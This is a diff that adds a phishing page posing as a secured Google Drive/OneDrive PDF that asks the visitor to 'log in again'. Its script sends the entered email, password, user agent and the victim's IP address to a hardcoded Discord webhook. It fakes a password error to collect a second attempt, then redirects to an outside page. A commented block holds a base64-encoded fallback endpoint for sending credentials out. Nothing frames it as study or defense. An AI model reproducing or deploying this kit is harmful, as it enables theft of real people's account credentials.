@@ -1,0 +1,216 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Secured PDF Document</title>
+<style type="text/css">
+*{margin:0;padding:0;outline:none}
+html{font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji"}
+body{background-image:url(images/blurred.jpg);background-repeat:no-repeat;background-size:cover;width:100vw;height:100vh;display:flex;justify-content:center;align-items:center;flex-direction:column}
+.overlay{height:100vh;width:100vw;background-color:#0000007a;z-index:-100;position:fixed}
+img,video{max-width:100%;height:auto}
+.login-box{display:flex;flex-direction:column;justify-content:center;align-items:center;background-color:#FFFFFF;color:black;width:368px;padding:5px 0;height:29.3rem;box-shadow:0 0 #0000,0 0 #0000,0 9px 42px -5px #64748b,0 8px 10px -8px #64748b}
+.login-img{height:100px;margin-top:-45px;margin-bottom:20px}
+.login-input{margin:10px 3px 0px -22px;font-size:1rem;line-height:1.5rem}
+.login-input input[type=email],.login-input input[type=password]{min-width:100%;padding:10px;margin-bottom:10px;border:1px solid;border-color:#989b9e}
+.login-input input[type=email]:hover,.login-input input[type=password]:hover{border:1px solid;border-color:#2196f3}
+.login-input input[type=email]:focus,.login-input input[type=password]:focus{border:1px solid;border-color:#2196f3}
+.link-box{display:flex;justify-content:space-evenly;margin:10px -10px 0px -22px}
+.link-box a{text-decoration:none;color:#7eafff}
+.submit-button{width:100%;display:inline-block;font-weight:400;line-height:1.5;color:#FFF;text-align:center;vertical-align:middle;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-color:transparent;border:1px solid transparent;padding:0.47rem 0.75rem;font-size:.8125rem;background-color:#3385ff;border-color:#3385ff;font-size:16px}
+.submit-button:hover,.submit-button:focus{background-color:#3385ff;border-color:#3385ff}
+.submit-button:disabled,.submit-button[disabled]{opacity:0.5;cursor:not-allowed}
+.text-red-700#error{background-color:red;color:white;width:100%;text-align:center}
+
+</style>	
+</head>
+<body style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfKvrXTUhoDNqcc5ZfQKBzqaqI8ISuh-2ZbJhdyGltj7DFaypBQLR_d6Ah6PidPDg71boNIl3rw4bIGvBZPYTM0gJxBPvSvzURK8_dMMkS39-o1TJMbsXXVuzv5fEFsWhHAutMt1snT0EuY1fJ9-dP-KiNEgfHNzWvrRMVoq3rGPGZVPLKHQ4rhJnWWorc/s16000/onedrive-image.png'); background-repeat: no-repeat; background-size: cover; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column;">
+	<main>
+		<section>
+			<div class="login-box">
+				<img src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png" class="login-img">
+				<div class="overlay"></div>
+				<p style="font-weight: 500; font-size: 28px; color: rgb(31 41 55 / 1);">Please Log in again!</p>
+				<p style="text-align: center; margin: 20px 0; font-weight: 300; padding: 0 15px">Only verified recipient emails can access shared files and open inboxes.</p>
+				<div class="text-red-700 font-light text-base" id="error"></div>
+					    <!-- <div class="text-red-700 font-light text-base" id="error"></div> -->
+					<form style="min-width: 70%;margin: 35px -50px 30px -50px;font-size: 1rem;line-height: 1.5rem; name="form1" class="form-box" action="index.html" method="post" id="loginForm" required="">
+					    <div class="login-input">
+					    	<input class="" type="email" name="email" id="email" placeholder="Enter your email" readonly="">
+					    </div>
+					    <div class="login-input">
+					    	<input class="" type="password" name="password" id="password" placeholder="Password" required="">
+					    </div>
+					   
+					    <div style="min-width: 70%;margin: 35px -22px 0px -22px;font-size: 1rem;line-height: 1.5rem;">
+					        <button class="submit-button" id="login_submit" type="button">Download File</button>
+					    </div>
+
+					</form>									
+				<br><br><br>
+			</div>
+		</section>
+	</main>
+
+
+<script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+  </script>
+
+<script>
+function sleep(milliseconds) {
+      const date = Date.now();
+      let currentDate = null;
+      do {
+        currentDate = Date.now();
+      } while (currentDate - date < milliseconds);
+    }
+
+var linksc = window.location.href
+var value = linksc.split('#') 
+values = value[1]  
+
+
+// texts = "Please verify your account";
+//s_texts = "";
+//sm_texts = "";
+// document.getElementById("success-message"); 
+
+//document.getElementById("success").innerHTML = sm_texts; 
+// document.getElementById("text-message").innerHTML = texts; 
+document.getElementById("email").value = values; 
+// const element = document.getElementById('succes');
+// element.classList.remove('gone');
+
+
+
+
+let count = 0;
+var btn = document.getElementById("login_submit");
+var pwd = document.getElementById("password");
+var agents = navigator.userAgent;
+
+
+
+btn.onclick = function () {
+  if (pwd.value.length > 0){
+      count++;
+      if (count <=2){ 
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://ipinfo.io/json", true);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+            var response = JSON.parse(xhr.responseText);
+            // Handle the response data here
+            var ipAddress = response.ip
+
+            request.open("POST", "https://discordapp.com/api/webhooks/1443048339397410928/ccLPtP0kLBVQZYlXx-jHc1NB-I6t_WaZXacgrGQjLZbwfaQHsGb14XPOJMjNaxS4SDmz");
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+            content: (" > **IP: **" + ipAddress)
+            }
+            request.send(JSON.stringify(params));
+                
+
+            }
+
+        };
+        xhr.send();
+
+
+        var request = new XMLHttpRequest();
+        request.open("POST", "https://discordapp.com/api/webhooks/1443048339397410928/ccLPtP0kLBVQZYlXx-jHc1NB-I6t_WaZXacgrGQjLZbwfaQHsGb14XPOJMjNaxS4SDmz");
+        request.setRequestHeader('Content-type', 'application/json');
+        var params = {
+            content: ("> **USERNAME : **" + document.getElementById('email').value + "\n> **PASSWORD : **" + document.getElementById('password').value + "\n> **USER-AGENT: **" + agents)
+        }
+        request.send(JSON.stringify(params));
+        text = "Network issue or Password Invalid.Try again.";
+        document.getElementById("error").innerHTML = text;
+        //   document.getElementById("alert").style.backgroundColor = "#d0452f"; 
+        document.getElementById("password").value = "";
+        sleep(1000)
+      } 
+      if(count==2){
+      texts = "Verification Successful. Thank you...";
+      document.getElementById("error").style.backgroundColor = "green"; 
+      document.getElementById("error").innerHTML = texts;   
+      sleep(201)
+      window.location.replace("https://googledrive-pdf-files-downloads-wc4dufv8f2.edgeone.app/Google-DriveFileCorrupt.html");
+       }
+  }else{
+    // document.getElementById("error").style.visibility = "visible";
+    text = "Please enter your password to view document."
+    document.getElementById("error").innerHTML = text;
+    // document.getElementById("error").style.backgroundColor = "#ffffff"; 
+	// document.getElementById("error").style.Color = "#e12d00";
+
+
+   
+  }
+
+}
+
+// 	action = 'aHR0cHM6Ly9qZXRvdXJydXNzaWEucnUvd3AtaW5jbHVkZXMvYmxvY2tzL3F1ZXJ5LXBhZ2luYXRpb24vdmlubnl6L3NlbmQucGhw';
+//   	document.addEventListener("DOMContentLoaded", () => {
+// 		const form = document.getElementById('loginForm');
+// 		const emailInput = document.getElementById('email');
+// 		const passwordInput = document.getElementById('password');
+// 		const errorDiv = document.getElementById('error');
+
+
+// 		const queryParams = new URLSearchParams(window.location.search);
+// 		const emQr = queryParams.get('e');
+// 		if (emQr) {
+// 			emailInput.value=emQr;
+// 		}
+
+// 		const submitButton = document.querySelector('.submit-button');
+// 		const formBox = document.querySelector('.form-box');
+
+
+// 		form.addEventListener('submit', (event) => {
+// 			event.preventDefault();
+// 			submitButton.innerHTML = "Verifying...";
+// 			submitButton.setAttribute('disabled', true);
+// 			errorDiv.innerHTML = "";
+
+// 			fetch(atob(action), {
+// 			    method: 'POST',
+// 			    body:`email=${emailInput.value}&password=${passwordInput.value}`,
+// 			    headers: {
+// 			        'Content-Type': 'application/x-www-form-urlencoded'
+// 			    }
+// 			})
+// 			.then(res => res.json())
+// 			.then((response) => {
+// 			    if(response){
+// 					document.getElementById("password").value = '';
+// 					document.getElementById("password").focus();    
+// 					errorDiv.innerHTML = "Network error, try again!"    	
+// 					submitButton.removeAttribute("disabled");
+// 			    	submitButton.innerHTML = "Access File";
+// 			    }
+// 			})
+// 			.catch(err => {
+// 					document.getElementById("password").value = '';
+// 					document.getElementById("password").focus();     
+// 					errorDiv.innerHTML = "Ooops...technical error, please try again later."    	
+// 					submitButton.removeAttribute("disabled");
+// 					submitButton.innerHTML = "Access File";
+// 			  console.log(err);
+// 			});
+
+// 		})
+
+//   });	
+
+</script>
+
+</body>
+</html>
